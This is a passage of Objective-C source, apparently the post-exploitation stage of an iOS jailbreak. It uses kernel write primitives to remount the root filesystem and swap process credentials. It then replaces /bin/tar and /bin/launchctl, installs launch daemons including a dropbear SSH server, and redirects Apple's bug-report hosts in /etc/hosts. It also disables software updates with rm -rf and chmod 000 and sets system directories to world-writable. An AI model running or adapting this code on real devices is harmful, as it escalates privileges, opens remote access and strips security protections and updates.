        char* nmz = strdup("/dev/disk0s1s1");
        int lolr = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
        NSLog(@"remounting: %d", lolr);
        
        v_mount = ReadAnywhere64(rootfs_vnode+off);
        
        WriteAnywhere32(v_mount + 0x71, v_flag);
    }
    
    {
        char path[256];
        uint32_t size = sizeof(path);
        _NSGetExecutablePath(path, &size);
        char* pt = realpath(path, 0);
        
        {
            __block pid_t pd = 0;
            NSString* execpath = [[NSString stringWithUTF8String:pt]  stringByDeletingLastPathComponent];
            
            
            int f = open("/.installed_yaluX", O_RDONLY);
            
            if (f == -1) {
                NSString* tar = [execpath stringByAppendingPathComponent:@"tar"];
                NSString* bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
                const char* jl = [tar UTF8String];
                
                unlink("/bin/tar");
                unlink("/bin/launchctl");
                
                copyfile(jl, "/bin/tar", 0, COPYFILE_ALL);
                chmod("/bin/tar", 0777);
                jl="/bin/tar"; //
                
                chdir("/");
                
                posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL}, NULL);
                NSLog(@"pid = %x", pd);
                waitpid(pd, 0, 0);
                
                
                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
                jl = [jlaunchctl UTF8String];
                
                copyfile(jl, "/bin/launchctl", 0, COPYFILE_ALL);
                chmod("/bin/launchctl", 0755);
                
                open("/.installed_yaluX", O_RDWR|O_CREAT);
                open("/.cydia_no_stash",O_RDWR|O_CREAT);
                
                
                system("echo '127.0.0.1 iphonesubmissions.apple.com' >> /etc/hosts");
                system("echo '127.0.0.1 radarsubmissions.apple.com' >> /etc/hosts");
                
                system("/usr/bin/uicache");
                
                system("killall -SIGSTOP cfprefsd");
                NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
                
                [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
                
                [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
                system("killall -9 cfprefsd");
                
            }
            {
                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
                char* jl = [jlaunchctl UTF8String];
                unlink("/usr/libexec/reload");
                copyfile(jl, "/usr/libexec/reload", 0, COPYFILE_ALL);
                chmod("/usr/libexec/reload", 0755);
                chown("/usr/libexec/reload", 0, 0);
                
            }
            {
                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
                char* jl = [jlaunchctl UTF8String];
                unlink("/Library/LaunchDaemons/0.reload.plist");
                copyfile(jl, "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
                chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
                chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
            }
            {
                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
                char* jl = [jlaunchctl UTF8String];
                unlink("/Library/LaunchDaemons/dropbear.plist");
                copyfile(jl, "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
                chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
                chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
            }
            unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
            
        }
    }
    chmod("/private", 0777);
    chmod("/private/var", 0777);
    chmod("/private/var/mobile", 0777);
    chmod("/private/var/mobile/Library", 0777);
    chmod("/private/var/mobile/Library/Preferences", 0777);
    system("rm -rf /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; touch /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chmod 000 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chown 0:0 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
    system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
    WriteAnywhere64(bsd_task+0x100, orig_cred);
    sleep(2);
    
    NSLog(@"done");
}
